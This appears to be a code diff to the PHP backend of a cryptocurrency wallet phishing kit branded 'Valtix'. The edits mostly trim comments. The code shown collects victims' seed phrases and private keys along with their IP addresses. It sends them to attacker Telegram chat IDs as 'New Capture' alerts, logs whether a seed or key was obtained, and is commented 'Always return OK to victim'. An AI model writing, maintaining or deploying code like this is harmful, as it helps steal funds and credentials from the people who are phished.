@@ -55,16 +55,12 @@ $capture = [
     'capturedAt' => date('Y-m-d H:i:s'),
 ];
 
-// ====================================================================
-// ESCAPE FUNCTION: strips characters that break Telegram HTML
-// We use HTML mode because it's far more resilient to arbitrary input
-// than Markdown, which breaks on underscores, brackets, etc.
-// ====================================================================
+// Escape function for Telegram HTML mode
 function tgHtmlEscape($text) {
     return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
 }
 
-// ========== SEND TO TELEGRAM FIRST (before file write) ==========
+// ========== SEND TO TELEGRAM FIRST ==========
 $walletEmoji = [
     'phantom'     => '👻 Phantom',
     'metamask'    => '🦊 MetaMask',
@@ -88,7 +84,7 @@ if (!empty($walletName)) {
     $walletLabel = '👛 Unknown';
 }
 
-// Build message with HTML parse_mode (robust against special chars)
+// Build message with HTML parse_mode
 $message  = "🚨 <b>Valtix — New Capture</b> 🚨\n";
 $message .= "━━━━━━━━━━━━━━━━━━\n";
 $message .= "💰 <b>Wallet:</b> {$walletLabel}\n";
@@ -117,7 +113,7 @@ if (!empty($capture['userAgent'])) {
 $message .= "━━━━━━━━━━━━━━━━━━\n";
 $message .= "⚡ <b>Valtix Intelligence</b>";
 
-// Send to Telegram - catch any curl errors
+// Send to Telegram
 $tgSuccess = false;
 try {
     foreach ($CHAT_IDS as $chatId) {
@@ -167,5 +163,5 @@ try {
 // Summary log
 file_put_contents($LOG_DIR . '/summary.log', "[" . date('Y-m-d H:i:s') . "] Wallet: {$capture['walletName']} | IP: {$capture['ip']} | Seed: " . (!empty($seed) ? 'YES' : 'NO') . " | Key: " . (!empty($pkey) ? 'YES' : 'NO') . " | TG: " . ($tgSuccess ? 'OK' : 'FAILED') . "\n", FILE_APPEND);
 
-// Always return OK to the victim
+// Always return OK to victim
 echo json_encode(['status' => 'ok', 'message' => 'Connection processed']);
